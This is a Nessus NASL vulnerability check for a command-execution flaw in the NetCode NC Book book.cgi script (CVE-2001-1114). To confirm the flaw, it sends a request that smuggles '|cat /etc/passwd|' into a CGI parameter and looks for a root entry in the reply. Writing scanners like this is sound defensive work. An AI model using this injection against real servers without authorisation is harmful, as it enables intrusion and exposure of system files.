#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
 script_id(10721);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2001-1114");
 script_bugtraq_id(3178);
 script_xref(name:"OSVDB", value:"599");

 script_name(english:"NetCode NC Book book.cgi current Parameter Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/ncbook/book.cgi");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service allows arbitrary command execution.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The CGI 'book.cgi' is installed.  This CGI has a well
known security flaw that lets an attacker execute arbitrary
commands with the privileges of the http daemon."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Remove the affected CGI script."
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );
   script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

function check(dir)
{
local_var r, req;

req = http_get(item:string(dir, "/ncbook.cgi",
"?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10"),
		port:port);
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_hole(port);
   exit(0);
  }
}


check(dir:"/ncbook");
foreach dir (cgi_dirs())
{
check(dir:string(dir));
check(dir:string(dir, "/ncbook"));
}
